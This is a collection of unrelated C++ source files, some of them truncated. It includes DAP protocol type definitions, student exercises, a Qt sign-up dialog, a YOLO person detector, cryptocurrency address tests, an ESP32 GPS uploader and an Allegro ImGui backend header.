    "#include \"dap/io.h\"\n#include \"dap/optional.h\"\n#include \"dap/protocol.h\"\n#include \"dap/session.h\"\n#include \"dap/typeinfo.h\"\n#include \"dap/typeof.h\"\n#include \"dap/variant.h\"\n\n#include \"dapDefines.h\"\nnamespace dap {\n\nDAP_IMPLEMENT_STRUCT_TYPEINFO(ledArray, \"ledArray\", DAP_FIELD(r, \"r\"),\n                              DAP_FIELD(g, \"g\"), DAP_FIELD(b, \"b\"));\n\nDAP_IMPLEMENT_STRUCT_TYPEINFO(sevenSegment, \"sevenSegment\",\n                              DAP_FIELD(zero, \"zero\"), DAP_FIELD(one, \"one\"),\n                              DAP_FIELD(two, \"two\"), DAP_FIELD(three, \"three\"));\n\nDAP_IMPLEMENT_STRUCT_TYPEINFO(BoardUpdateEvent, \"boardUpdate\",\n                              DAP_FIELD(ledArray, \"ledArray\"),\n                              DAP_FIELD(sevenSegment, \"sevenSegment\"));\n\nDAP_IMPLEMENT_STRUCT_TYPEINFO(UpdateInputResponse, \"updateInput\");\n\nDAP_IMPLEMENT_STRUCT_TYPEINFO(JoyStick, \"joyStick\", DAP_FIELD(up, \"up\"),\n                              DAP_FIELD(down, \"down\"), DAP_FIELD(left, \"left\"),\n                              DAP_FIELD(right, \"right\"),\n                              DAP_FIELD(pressed, \"pressed\"));\n\nDAP_IMPLEMENT_STRUCT_TYPEINFO(Buttons, \"buttons\", DAP_FIELD(top, \"top\"),\n                              DAP_FIELD(bottom, \"bottom\"),\n                              DAP_FIELD(left, \"left\"),\n                              DAP_FIELD(right, \"right\"),\n                              DAP_FIELD(center, \"center\"));\n\nDAP_IMPLEMENT_STRUCT_TYPEINFO(UpdateInputRequest, \"updateInput\",\n                              DAP_FIELD(joystick, \"joystick\"),\n                              DAP_FIELD(button, \"button\"),\n                              DAP_FIELD(dip_switches, \"dip_switches\"));\n\nDAP_IMPLEMENT_STRUCT_TYPEINFO(LaunchRequestWithArgs, \"launch\",\n                              DAP_FIELD(program, \"program\"));\n\nDAP_IMPLEMENT_STRUCT_TYPEINFO(SetMemory, \"setMemory\",\n                              DAP_FIELD(address, \"address\"),\n                              DAP_FIELD(size, \"size\"),\n                              DAP_FIELD(value, \"value\"));\n\nDAP_IMPLEMENT_STRUCT_TYPEINFO(SetStateRequest, \"setState\",\n                              DAP_FIELD(ledArray, \"ledArray\"),\n                              DAP_FIELD(sevenSegment, \"sevenSegment\"),\n                              DAP_FIELD(dip_switches, \"dip_switches\"),\n                              DAP_FIELD(joystick, \"joystick\"),\n                              DAP_FIELD(buttons, \"buttons\"),\n                              DAP_FIELD(memory, \"memory\"), DAP_FIELD(pc, \"pc\"),\n                              DAP_FIELD(registers, \"registers\"));\n\nDAP_IMPLEMENT_STRUCT_TYPEINFO(SetStateResponse, \"setState\");\n\nDAP_IMPLEMENT_STRUCT_TYPEINFO(getMemory, \"getMemory\",\n                              DAP_FIELD(address, \"address\"),\n                              DAP_FIELD(size, \"size\"));\n\nDAP_IMPLEMENT_STRUCT_TYPEINFO(GetStateRequest, \"getState\",\n                              DAP_FIELD(memory, \"memory\"));\n\nDAP_IMPLEMENT_STRUCT_TYPEINFO(GetStateResponse, \"getState\",\n                              DAP_FIELD(ledArray, \"ledArray\"),\n                              DAP_FIELD(sevenSegment, \"sevenSegment\"),\n                              DAP_FIELD(dip_switches, \"dip_switches\"),\n                              DAP_FIELD(joystick, \"joystick\"),\n                              DAP_FIELD(buttons, \"buttons\"),\n                              DAP_FIELD(memory, \"memory\"), DAP_FIELD(pc, \"pc\"),\n                              DAP_FIELD(registers, \"registers\"));\n\n} // namespace dap",
    "#include <iostream>\n\n\nusing namespace std;\n\nclass bankAccount {\nprivate:\n\tdouble balance;\n\npublic:\n\n\t//constructor\n\tbankAccount(double initialBalance) {\n\t\n\t\tif (initialBalance >= 0) {\n\t\t\tbalance = initialBalance;\n\t\t}\n\t\telse {\n\t\t\tbalance = 0;\n\t\t\tcout << \"balance set to 0\" << endl;\n\n\t\t}\n\t}\n\n\t// check to balance\n\tdouble getBalance() {\n\t\treturn balance;\n\t}\n\n\t// method to deposite money\n\tvoid deposit(double amount) {\n\t\tif (amount > 0) {\n\t\t\tbalance += amount;\n\t\t\tcout << amount << \" into deposited to system\" << endl;\n\n\t\t}\n\t\telse {\n\t\t\tcout << \"invalid account\" << endl;\n\n\t\t}\n\t}\n\n\n\t//method to withdraw money\n\tvoid withDraw(double amount) {\n\t\tif (amount > 0 && amount <= balance) {\n\t\t\tbalance -= amount;\n\t\t\tcout << amount << \"  withdrawn from the account\" << endl;\n\n\t\t}\n\t\telse {\n\t\t\tcout << \"Insufficient balance or invalid amount.\" << endl;\n\n\t\t}\n\t}\n};\n\n\nint main() {\n\t// create account\n\tbankAccount account1(1000);\n\n\t// check the balance\n\tcout << \"initial balance: \" << account1.getBalance() << \"TL\" << endl;\n\n\t//deposit money\n\taccount1.deposit(1000);\n\tcout << \"current balance: \" << account1.getBalance() << \"TL\" << endl;\n\n\t//withdrawn money\n\taccount1.withDraw(300);\n\tcout << \"current balance: \" << account1.getBalance() << \"TL\" << endl;\n\n\treturn 0;\n\n\n}",
    "#include \"registerdialog.h\"\n\n#include <QLabel>\n#include <QLineEdit>\n\n#include \"global.h\"\n#include \"httpmgr.h\"\n#include \"qlineedit.h\"\n#include \"qregularexpression.h\"\n#include \"ui_registerdialog.h\"\n\nRegisterDialog::RegisterDialog(QWidget* parent) : QDialog(parent),\n                                                  ui(new Ui::RegisterDialog),\n                                                  countdown_(5) {\n  ui->setupUi(this);\n  ui->passwd_lineEdit->setEchoMode(QLineEdit::Password);\n  ui->passwd_comfirm_lineEdit->setEchoMode(QLineEdit::Password);\n  ui->error_label->setProperty(\"state\", \"normal\");\n  Repolish()(ui->error_label);\n  ui->error_label->clear();\n\n  initInputErrorCheck();\n\n  initHttpHandlers();\n  connect(HttpMgr::GetInstance().get(), &HttpMgr::sig_reg_mod_finish, this,\n      &RegisterDialog::slot_reg_mod_finish);\n\n  connect(ui->passwd_visible, &ClickedLabel::clicked, this, [this] {\n    ui->passwd_lineEdit->setEchoMode(\n        ui->passwd_visible->getCurSate() == ClickLbState::kSelected\n          ? QLineEdit::Normal\n          : QLineEdit::Password);\n  });\n  connect(ui->confirm_visible, &ClickedLabel::clicked, this, [this] {\n    ui->passwd_comfirm_lineEdit->setEchoMode(\n        ui->confirm_visible->getCurSate() == ClickLbState::kSelected\n          ? QLineEdit::Normal\n          : QLineEdit::Password);\n  });\n\n  countdown_timer_ = new QTimer(this);\n  connect(countdown_timer_, &QTimer::timeout, this, [this] {\n    if (--countdown_ == 0) {\n      stopCountdownTimer();\n      emit switchLogin();\n      return;\n    }\n    ui->label_success->setText(QString(\"\u6ce8\u518c\u6210\u529f\uff0c%1s\u540e\u8fd4\u56de\u767b\u5f55\").arg(countdown_));\n  });\n\n  connect(ui->return_btn, &QPushButton::clicked, this, [this] {\n    stopCountdownTimer();\n    emit switchLogin();\n  });\n  connect(ui->cancel_btn, &QPushButton::clicked, this, [this] {\n    stopCountdownTimer();\n    emit switchLogin();\n  });\n}\n\nRegisterDialog::~RegisterDialog() {\n  fmt::println(\"RegisterDialog::~RegisterDialog\");\n  delete ui;\n}\n\nvoid RegisterDialog::on_captcha_btn_clicked() {\n  auto email = ui->email_lineEdit->text();\n  static QRegularExpression regex(\n      R\"(^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+.[a-zA-Z]{2,}$)\");\n  auto match = regex.match(email).hasMatch();\n  if (!match) {\n    showTip(tr(\"\u90ae\u7bb1\u5730\u5740\u4e0d\u6b63\u786e\"), false);\n    ui->captcha_btn->Stop();\n    return;\n  }\n\n  // \u53d1\u9001\u9a8c\u8bc1\u7801\n  nlohmann::json json;\n  json[\"email\"] = email.toStdString();\n  HttpMgr::GetInstance()->PostHttpRequest(\n      QUrl(gate_url_prefix + \"/get_verifycode\"), json, kIdGetVerifyCode,\n      kRegisterMod);\n  showTip(tr(\"\u9a8c\u8bc1\u7801\u5df2\u53d1\u9001\"), true);\n}\n\nvoid RegisterDialog::on_sure_btn_clicked() {\n  if (!tip_err_.empty()) {\n    showTip(tr(\"\u8f93\u5165\u6709\u8bef\"), false);\n    return;\n  }\n\n  nlohmann::json json;\n  json[\"user\"] = ui->user_lineEdit->text().toStdString();\n  json[\"email\"] = ui->email_lineEdit->text().toStdString();\n  json[\"passwd\"] = HashPassword(ui->passwd_lineEdit->text().toStdString());\n  json[\"confirm\"] = json[\"passwd\"];\n  json[\"verifycode\"] = ui->captcha_lineEdit->text().toStdString();\n  HttpMgr::GetInstance()->PostHttpRequest(\n      QUrl(gate_url_prefix + \"/user_register\"), json, kIdRegUser, kRegisterMod);\n}\n\nvoid RegisterDialog::slot_reg_mod_finish(ReqId id, QString res,\n    ErrorCode error_code) {\n  if (error_code != ErrorCode::kSuccess) {\n    showTip(tr(\"\u7f51\u7edc\u8bf7\u6c42\u9519\u8bef\"), false);\n    return;\n  }\n\n  nlohmann::json json = nlohmann::json::parse(res.toStdString());\n  if (json.is_null()) {\n    showTip(tr(\"json\u89e3\u6790\u5931\u8d25\"), false);\n    return;\n  }\n\n  if (json.empty()) {\n    showTip(tr(\"json\u89e3\u6790\u5931\u8d25\"), false);\n    return;\n  }\n\n  handlers_[id](json);\n}\n\nvoid RegisterDialog::showTip(QString text, bool normal) {\n  ui->error_label->setText(text);\n\n  ui->error_label->setProperty(\"state\", normal ? \"normal\" : \"error\");\n\n  Repolish()(ui->error_label);\n}\n\nvoid RegisterDialog::initHttpHandlers() {\n  handlers_.insert(ReqId::kIdGetVerifyCode, [this](const nlohmann::json& json) {\n    int error_code = json[\"error\"];\n    if (error_code != ErrorCode::kSuccess) {\n      showTip(tr(\"\u53c2\u6570\u9519\u8bef\"), false);\n      ui->captcha_btn->Stop();\n      return;\n    }\n\n    std::string email = json[\"email\"];\n    std::string verify_code = json[\"verifycode\"];\n    ui->captcha_lineEdit->setText(QString::fromStdString(verify_code));\n    showTip(tr(\"\u9a8c\u8bc1\u7801\u5df2\u53d1\u9001\u5230\u90ae\u7bb1\"), true);\n    fmt::print(\"email is {}\\n\", email);\n    fmt::print(\" verify_code is {}\\n\", verify_code);\n  });\n\n  handlers_.insert(ReqId::kIdRegUser, [this](const nlohmann::json& json) {\n    int error_code = json[\"error\"];\n    if (error_code != ErrorCode::kSuccess) {\n      if (error_code == ErrorCode::kVerifyCodeErr) {\n        showTip(tr(\"\u9a8c\u8bc1\u7801\u9519\u8bef\"), false);\n      } else if (error_code == ErrorCode::kVerifyExpired) {\n        showTip(tr(\"\u9a8c\u8bc1\u7801\u8fc7\u671f\"), false);\n      } else {\n        showTip(tr(\"\u53c2\u6570\u9519\u8bef\"), false);\n      }\n      return;\n    }\n\n    std::string_view email = json[\"email\"];\n    showTip(tr(\"\u7528\u6237\u6ce8\u518c\u6210\u529f\"), true);\n    fmt::print(\"email is {}\\n\", email);\n\n    changeToTipPage();\n  });\n}\n\nvoid RegisterDialog::initInputErrorCheck() {\n  connect(ui->user_lineEdit, &QLineEdit::editingFinished, this",
    "/*\r\n\r\nBEST BEST BEST FOR PHOTOS\r\n*/\r\n#include <opencv2/opencv.hpp>\r\n#include <opencv2/dnn.hpp>\r\n#include <iostream>\r\n#include <fstream>\r\n\r\nusing namespace cv;\r\nusing namespace cv::dnn;\r\nusing namespace std;\r\n\r\n// Function to load class names from coco.names file\r\nvector<string> loadClassNames(const string& path) {\r\n    vector<string> classNames;\r\n    ifstream ifs(path);\r\n    string line;\r\n    while (getline(ifs, line)) {\r\n        classNames.push_back(line);\r\n    }\r\n    return classNames;\r\n}\r\n\r\nint main() {\r\n    // Load the YOLO model\r\n    String modelWeights = \"F:/extract/opencv/sources/data/yolov4.weights\";   // Path to the weights file\r\n    String modelConfig = \"F:/extract/opencv/sources/data/yolov4.cfg\";        // Path to the configuration file\r\n    String classesFile = \"F:/extract/opencv/sources/data/coco.names\";        // Path to the class names file\r\n\r\n    Net net = readNetFromDarknet(modelConfig, modelWeights);\r\n    net.setPreferableBackend(DNN_BACKEND_OPENCV);\r\n    net.setPreferableTarget(DNN_TARGET_CPU);\r\n\r\n    // Load class names\r\n    vector<string> classNames = loadClassNames(classesFile);\r\n\r\n    // Read the image file\r\n    String imagePath = \"F:/minor/ed.jpg\";  // Replace with the path to your image\r\n    Mat frame = imread(imagePath);\r\n\r\n    if (frame.empty()) {\r\n        cout << \"Error: Could not open or find the image!\" << endl;\r\n        return -1;\r\n    }\r\n\r\n    // Prepare the input blob for the network\r\n    Mat blob = blobFromImage(frame, 1 / 255.0, Size(416, 416), Scalar(0, 0, 0), true, false);\r\n\r\n    // Set the input blob for the network\r\n    net.setInput(blob);\r\n\r\n    // Forward pass: get the output layers\r\n    vector<Mat> outs;\r\n    vector<string> outNames = net.getUnconnectedOutLayersNames();\r\n    net.forward(outs, outNames);\r\n\r\n    // Post-process the detections\r\n    float confThreshold = 0.5;  // Confidence threshold\r\n    float nmsThreshold = 0.4;   // Non-maximum suppression threshold\r\n    vector<int> classIds;\r\n    vector<float> confidences;\r\n    vector<Rect> boxes;\r\n\r\n    for (size_t i = 0; i < outs.size(); ++i) {\r\n        float* data = (float*)outs[i].data;\r\n        for (int j = 0; j < outs[i].rows; ++j, data += outs[i].cols) {\r\n\r\n            // Extract the scores corresponding to the predicted classes\r\n            Mat scores = outs[i].row(j).colRange(5, outs[i].cols);\r\n\r\n            Point classIdPoint;\r\n            double confidence;\r\n\r\n             // Find the class with the highest score (confidence) and its index\r\n            minMaxLoc(scores, 0, &confidence, 0, &classIdPoint);\r\n            \r\n            if (confidence > confThreshold) {\r\n                // Calculate the center, width, and height of the bounding box (normalized values from YOLO)\r\n                int centerX = (int)(data[0] * frame.cols);   // X-coordinate of the bounding box center\r\n                int centerY = (int)(data[1] * frame.rows);   // Y-coordinate of the bounding box center\r\n                int width = (int)(data[2] * frame.cols);     // Width of the bounding box\r\n                int height = (int)(data[3] * frame.rows);    // Height of the bounding box\r\n\r\n                // Calculate the top-left corner of the bounding box\r\n                int left = centerX - width / 2;\r\n                int top = centerY - height / 2;\r\n\r\n                classIds.push_back(classIdPoint.x);\r\n                confidences.push_back((float)confidence);\r\n                boxes.push_back(Rect(left, top, width, height));\r\n            }\r\n        }\r\n    }\r\n\r\n    // Apply non-maximum suppression to filter out overlapping boxes\r\n    vector<int> indices;\r\n    dnn::NMSBoxes(boxes, confidences, confThreshold, nmsThreshold, indices);\r\n\r\n    // Draw the results\r\n    for (size_t i = 0; i < indices.size(); ++i) {\r\n        int idx = indices[i];\r\n        Rect box = boxes[idx];\r\n        if (classNames[classIds[idx]] == \"person\") {\r\n            // Draw a rectangle around the detected person\r\n            rectangle(frame, box, Scalar(0, 255, 0), 2);\r\n            // Put label\r\n            putText(frame, \"Potential Poacher\", Point(box.x, box.y - 5), FONT_HERSHEY_SIMPLEX, 0.5, Scalar(0, 255, 0), 2);\r\n        }\r\n    }\r\n\r\n    // Display the resulting image\r\n    imshow(\"YOLO Human Detection\", frame);\r\n    waitKey(0);  // Wait for a key press\r\n\r\n    // Destroy any OpenCV windows\r\n    destroyAllWindows();\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n\n\nusing namespace std;\n\nconst int dimensioneMax=100;\n\n//prototipi\nvoid caricaVettori(string codice[], string nomi[], string casa[], string classe[], float prezzo[], int n);\nvoid cercaProdottoCodice(string codice[], string nomi[], string casa[], string classe[], float prezzo[], int n);\nvoid ordinamentoAlfabetico(string nomi[], int n, string classe[], string vAlpha[]);\nvoid aggiornaPrezzo(string codice[], float prezzo[], float prezzo1[]);\nfloat media(string classe[], float prezzo[], int n, float prezziClasse[], int &d);\nvoid fasciaPrezzo(string codice[], string nomi[], string casa[], float prezzo[], string classe[], int n);\nvoid stampaMassimo(string nomi[], float prezzo[], int n, string classe[], string casa[], string codice[]);\nint Menu();\n\n\nint main() {\n    int N;\n    string CODICE[dimensioneMax];\n    string NOME[dimensioneMax];\n    string CASA[dimensioneMax];\n    string CLASSE[dimensioneMax];\n    float PREZZO[dimensioneMax];\n    string Nomi_Alfabetico[dimensioneMax];\n    string codiciDaAggiornare[dimensioneMax];\n    float prezziDaAggiornare[dimensioneMax];\n    int d=0;\n    float prezziClasse[dimensioneMax];\n    float m=0.00;\n    int scelta;\n\n    do {\n        scelta=Menu();\n        switch(scelta) {\n            case 1:\n              cout<<\"Inserisci il numero di prodotti da inserire: \";\n              cin>>N;\n              caricaVettori(CODICE,NOME,CASA,CLASSE,PREZZO,N);\n            break;\n            case 2:\n              stampaMassimo(NOME,PREZZO,N,CLASSE,CASA,CODICE);\n            break;\n            case 3:\n              cercaProdottoCodice(CODICE,NOME,CASA,CLASSE,PREZZO,N);\n            break;\n            case 4:\n              ordinamentoAlfabetico(NOME,N,CLASSE,Nomi_Alfabetico);\n            break;\n            case 5:\n              aggiornaPrezzo(CODICE,PREZZO,prezziDaAggiornare);\n            break;\n            case 6:\n              m=media(CLASSE,PREZZO,N,prezziClasse,d);\n              cout<<\"La media dei prezzi dei prodotti della classe inserita e' : \"<<m<<endl;\n            break;\n            case 7:\n              fasciaPrezzo(CODICE,NOME,CASA,PREZZO,CLASSE,N);\n            break;\n            case 0:\n             cout<<\"Esci\"<<endl;\n            break;\n            default:\n             cout<<\"Attenzione, scelta sbagliata!\"<<endl;\n            break;\n        }\n    }while(scelta!=0);\n\n    return 0;\n}\n\n\nint Menu () {\n  int scegli;\n  cout<<\"-------MENU'-------\"<<endl;\n  cout<<\"1-Inserisci prodotti\"<<endl;\n  cout<<\"2-Stampa il prodotto con prezzo maggiore appartenente ad una determinata classe\"<<endl;\n  cout<<\"3-Ricerca prodotto dato il codice\"<<endl;\n  cout<<\"4-Stampa prodotti in ordine alfabetico data una classe\"<<endl;\n  cout<<\"5-Aggiorna prezzi\"<<endl;\n  cout<<\"6-Stampare la media dei prodotti di una determinata categoria\"<<endl;\n  cout<<\"7-Stampare i dati di un prodotto che rientra in una determinata fascia di prezzo\"<<endl;\n\n  cout<<\"0-Fine\"<<endl;\n\n  cout<<\"Scegli un operazione: \"<<endl;\n  cin>>scegli;\n\n  return scegli;\n}\n\n\n\nvoid caricaVettori(string codice[], string nomi[], string casa[], string classe[], float prezzo[], int n) {\n  for(int i=0; i<n; i++) {\n    cout<<\"Inserisci il codice, il nome, la casa produttrice, la categoria e il prezzo del prodotto: \";\n    cin>>codice[i]>>nomi[i]>>casa[i]>>classe[i]>>prezzo[i];\n  }\n}\n\n\nvoid cercaProdottoCodice(string codice[], string nomi[], string casa[], string classe[], float prezzo[], int n) {\n  string codiceProdotto;\n  int i=0;\n\n\n  cout<<endl;\n\n  cout<<\"Inserisci il codice del prodotto: \";\n  cin>>codiceProdotto;\n  while(i<n&&codice[i]!=codiceProdotto) {\n      i=i+1;\n  }\n\n  if(i>=n) {\n      cout<<codiceProdotto<<\" non e' presente nei prodotti\"<<endl;\n  } else {\n      cout<<\"il prodotto con codice \"<<codiceProdotto<<\" e' presente nei prodotti\"<<endl;\n      cout<<\"il nome del prodotto e': \"<<nomi[i]<<endl;\n      cout<<\"la casa produttrice del prodotto e': \"<<casa[i]<<endl;\n      cout<<\"la categoria del prodotto e': \"<<classe[i]<<endl;\n      cout<<\"il prezzo del prodotto e': \"<<prezzo[i]<<endl;\n  }\n\n  cout<<endl;\n}\n\n\nvoid ordinamentoAlfabetico(string nomi[], int n, string classe[], string vAlpha[]) {\n\n  string classeProdotto;\n  string temp;\n  \n  cout<<\"Inserisci la classe dei prodotti da ordinare: \";\n  cin>>classeProdotto;\n  for(int i=0; i<n; i++) {\n    if(classeProdotto==classe[i]) {\n      vAlpha[i]=nomi[i];\n    }\n  }\n\n  for(int i=0; i<n-1; i++) {\n    for(int j=i+1; j<n; j++) {\n      if(vAlpha[i]>vAlpha[j]) {\n        temp=vAlpha[i];\n        vAlpha[i]=vAlpha[j];\n        vAlpha[j]=temp;\n      }\n    }\n  }\n\n  cout<<\"I prodotti della classe \"<<classeProdotto<<\" in ordine alfabetico sono: \"<<endl;\n  for(int i=0; i<n; i++) {\n    cout<<vAlpha[i]<<endl;\n  }\n  \n}\n\nvoid aggiornaPrezzo(string codice[], float prezzo[], float prezzo1[]) {\n    \n  int nProdotti=0;\n  \n  cout<<\"Quanti prodottti vuoi aggiornare ? : \";\n  cin>>nProdotti;\n    \n  for(int i=0; i<nProdotti; i++) {\n    cout<<\"Inserisci il codice del prodotto da aggiornare e il nuovoi prezzo: \";\n    cin>",
    "// SPDX-License-Identifier: Apache-2.0\n//\n// Copyright \u00a9 2017 Trust Wallet.\n\n#include \"AnyAddress.h\"\n#include \"HexCoding.h\"\n\n#include <gtest/gtest.h>\n\nnamespace TW::tests {\n\nconstexpr auto ANY_ADDRESS_TEST_ADDRESS = \"bc1qcj2vfjec3c3luf9fx9vddnglhh9gawmncmgxhz\";\nconstexpr auto ANY_ADDRESS_TEST_PUBKEY = \"02753f5c275e1847ba4d2fd3df36ad00af2e165650b35fe3991e9c9c46f68b12bc\";\n\nTEST(AnyAddress, createFromString) {\n    std::unique_ptr<AnyAddress> addr(AnyAddress::createAddress(ANY_ADDRESS_TEST_ADDRESS, TWCoinTypeBitcoin));\n    EXPECT_EQ(ANY_ADDRESS_TEST_ADDRESS, addr->address);\n}\n\nTEST(AnyAddress, createFromPubKey) {\n    const Data key = parse_hex(ANY_ADDRESS_TEST_PUBKEY);\n    PublicKey publicKey(key, TWPublicKeyTypeSECP256k1);\n    std::unique_ptr<AnyAddress> addr(AnyAddress::createAddress(publicKey, TWCoinTypeBitcoin));\n    EXPECT_EQ(ANY_ADDRESS_TEST_ADDRESS, addr->address);\n}\n\nTEST(AnyAddress, createFromPubKeyDerivation) {\n    const Data key = parse_hex(ANY_ADDRESS_TEST_PUBKEY);\n    PublicKey publicKey(key, TWPublicKeyTypeSECP256k1);\n    {\n        std::unique_ptr<AnyAddress> addr(AnyAddress::createAddress(publicKey, TWCoinTypeBitcoin, TWDerivationDefault, std::monostate()));\n        EXPECT_EQ(addr->address, ANY_ADDRESS_TEST_ADDRESS);\n    }\n    {\n        std::unique_ptr<AnyAddress> addr(AnyAddress::createAddress(publicKey, TWCoinTypeBitcoin, TWDerivationBitcoinLegacy, std::monostate()));\n        EXPECT_EQ(addr->address, \"1JvRfEQFv5q5qy9uTSAezH7kVQf4hqnHXx\");\n    }\n}\n\nTEST(AnyAddress, createFromWrongString) {\n    std::unique_ptr<AnyAddress> addr(AnyAddress::createAddress(\"1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaax\", TWCoinTypeBitcoin));\n    EXPECT_EQ(nullptr, addr);\n}\n\n} // namespace TW::tests\n",
    "#include <Arduino.h>\n#include \"secrets.hpp\"\n#include <WiFiClientSecure.h>\n#include <MQTTClient.h>\n#include <ArduinoJson.h>\n#include <TinyGPS++.h>\n#include \"WiFi.h\"\n#include <SoftwareSerial.h>\n\n#define RXD2 16\n#define TXD2 17\n#define MONITOR_SPEED 9600\n\n// put function declarations here:\n\nTinyGPSPlus gps;\nSoftwareSerial gpsSerial(RXD2, TXD2);\n\n/**\n * Para modificar la conexion a internet ir al archivo secrets.hpp\n * Solo editar WIFI_SSID y WIFI_PASSWORD\n */\n\n/**\n * Inicio del Setup de Conexion a AWS IoT Core\n * No toca modificar nada aqu\u00ed\n */\n// The MQTT topics that this device should publish/subscribe\n#define AWS_IOT_PUBLISH_TOPIC \"charting\"\nWiFiClientSecure net = WiFiClientSecure();\nMQTTClient client = MQTTClient(256);\n\nvoid connectAWS()\n{\n  WiFi.mode(WIFI_STA);\n  WiFi.begin(WIFI_SSID, WIFI_PASSWORD);\n  Serial.println(\"Connecting to Wi-Fi\");\n  while (WiFi.status() != WL_CONNECTED)\n  {\n    delay(500);\n    Serial.print(\".\");\n  }\n  // Configure WiFiClientSecure to use the AWS IoT device credentials\n  net.setCACert(AWS_CERT_CA);\n  net.setCertificate(AWS_CERT_CRT);\n  net.setPrivateKey(AWS_CERT_PRIVATE);\n  // Connect to the MQTT broker on the AWS endpoint we defined earlier\n  client.begin(AWS_IOT_ENDPOINT, 8883, net);\n  // Create a message handler\n  // client.onMessage(messageHandler);\n  Serial.print(\"Connecting to AWS IOT\");\n  while (!client.connect(THINGNAME))\n  {\n    Serial.print(\".\");\n    delay(100);\n  }\n  if (!client.connected())\n  {\n    Serial.println(\"AWS IoT Timeout!\");\n    return;\n  }\n  // Subscribe to a topic\n  client.subscribe(AWS_IOT_PUBLISH_TOPIC);\n  Serial.println(\"AWS IoT Connected!\");\n}\n\nvoid publishMesssage(float speed, float lat, float lng)\n{\n  // See https://arduinojson.org/\n  JsonDocument doc;\n  doc[\"speed\"] = speed;\n  doc[\"lat\"] = lat;\n  doc[\"lng\"] = lng;\n  char jsonBuffer[512];\n  serializeJson(doc, jsonBuffer); // print to mqtt_client\n\n  // Publish to the topic\n  client.publish(AWS_IOT_PUBLISH_TOPIC, jsonBuffer);\n  Serial.println(\"Sent a message\");\n}\n/**\n * Fin del Setup de Conexi\u00f3n a AWS IoT Core\n */\n\n/**\n * A partir de aqui inyecten todo el codigo que tenian antes de los sensores\n */\n\nvoid setup()\n{\n  Serial.begin(MONITOR_SPEED);\n  // Start Serial 2 with the defined RX and TX pins and a baud rate of 9600\n  gpsSerial.begin(MONITOR_SPEED);\n  connectAWS();\n}\n\nvoid loop()\n{\n  Serial.println(\"Entrando a loop\");\n  while (gpsSerial.available() > 0)\n  {\n    gps.encode(gpsSerial.read());\n    Serial.println(\"Entre aqui a gpsSerialAvailable\");\n  }\n  Serial.println(\"Pude salir de gpsSerial loop\");\n\n  if (gps.location.isUpdated())\n  {\n    /**\n     * Ajustar para colocar los valores de los sensores en estas tres variables\n     */\n    float speed = 0; // valor resultado de la medicion de la velocidad\n    float lat = gps.location.lat();\n    float lng = gps.location.lng();\n\n    Serial.print(\"Latitud = \");\n    Serial.println(lat, 6);\n    Serial.print(\"Longitud = \");\n    Serial.println(lng, 6);\n    publishMesssage(speed, lat, lng);\n    client.loop();\n  }\n  Serial.println(\"Finalize por aqui, antes de delay\");\n  delay(1000);\n}\n",
    "#define HIGH_ACC_FAST_SCAN\n#define EIGEN_DONT_PARALLELIZE\n#include <fstream>\n#include <iostream>\n\n#include \"index/IVF.hpp\"\n#include \"utils/IO.hpp\"\n#include \"utils/StopW.hpp\"\n\nint main(int argc, char* argv[]) {\n    assert(argc == 4);\n    char* DATASET = argv[1];\n    size_t K = atoi(argv[2]);\n    int B = atoi(argv[3]);\n    assert(B == 9 || B == 5 || B == 7 || B == 3 || B == 4 || B == 8);\n\n    char data_file[500];\n    char centroids_file[500];\n    char cids_file[500];\n    char ivf_file[500];\n    char log_file[500];\n\n    sprintf(data_file, \"../data/%s/%s_base.fvecs\", DATASET, DATASET);\n    sprintf(centroids_file, \"../data/%s/%s_centroid_%ld.fvecs\", DATASET, DATASET, K);\n    sprintf(cids_file, \"../data/%s/%s_cluster_id_%ld.ivecs\", DATASET, DATASET, K);\n    sprintf(ivf_file, \"../data/%s/ivf_exhaf%d.index\", DATASET, B);\n    sprintf(log_file, \"../results/indexing_time/%s.csv\", DATASET);\n\n    FloatRowMat data;\n    FloatRowMat centroids;\n    UintRowMat cids;\n\n    load_vecs<float, FloatRowMat>(data_file, data);\n    load_vecs<float, FloatRowMat>(centroids_file, centroids);\n    load_vecs<PID, UintRowMat>(cids_file, cids);\n\n    size_t N = data.rows();\n    size_t DIM = data.cols();\n\n    std::cout << \"data loaded\\n\";\n    std::cout << \"\\tN: \" << N << '\\n';\n    std::cout << \"\\tDIM: \" << DIM << '\\n';\n\n    StopW stopw;\n    IVF ivf(N, DIM, K, B);\n    ivf.construct(data.data(), centroids.data(), cids.data());\n    float miniutes = stopw.getElapsedTimeMili() / 1000 / 60;\n    std::cout << \"ivf constructed \\n\";\n    ivf.save(ivf_file);\n\n    std::cout << \"Indexing time: \" << miniutes << \"miniutes\\n\";\n\n    return 0;\n}",
    "// dear imgui: Renderer + Platform Backend for Allegro 5\n// (Info: Allegro 5 is a cross-platform general purpose library for handling windows, inputs, graphics, etc.)\n\n// Implemented features:\n//  [X] Renderer: User texture binding. Use 'ALLEGRO_BITMAP*' as ImTextureID. Read the FAQ about ImTextureID!\n//  [X] Platform: Clipboard support (from Allegro 5.1.12)\n//  [X] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange'.\n// Issues:\n//  [ ] Renderer: The renderer is suboptimal as we need to unindex our buffers and convert vertices manually.\n//  [ ] Platform: Missing gamepad support.\n\n// You can copy and use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// If you are new to Dear ImGui, read documentation from the docs/ folder + read the top of imgui.cpp.\n// Read online: https://github.com/ocornut/imgui/tree/master/docs\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2021-02-18: Change blending equation to preserve alpha in output buffer.\n//  2020-08-10: Inputs: Fixed horizontal mouse wheel direction.\n//  2019-12-05: Inputs: Added support for ImGuiMouseCursor_NotAllowed mouse cursor.\n//  2019-07-21: Inputs: Added mapping for ImGuiKey_KeyPadEnter.\n//  2019-05-11: Inputs: Don't filter character value from ALLEGRO_EVENT_KEY_CHAR before calling AddInputCharacter().\n//  2019-04-30: Renderer: Added support for special ImDrawCallback_ResetRenderState callback to reset render state.\n//  2018-11-30: Platform: Added touchscreen support.\n//  2018-11-30: Misc: Setting up io.BackendPlatformName/io.BackendRendererName so they can be displayed in the About Window.\n//  2018-06-13: Platform: Added clipboard support (from Allegro 5.1.12).\n//  2018-06-13: Renderer: Use draw_data->DisplayPos and draw_data->DisplaySize to setup projection matrix and clipping rectangle.\n//  2018-06-13: Renderer: Backup/restore transform and 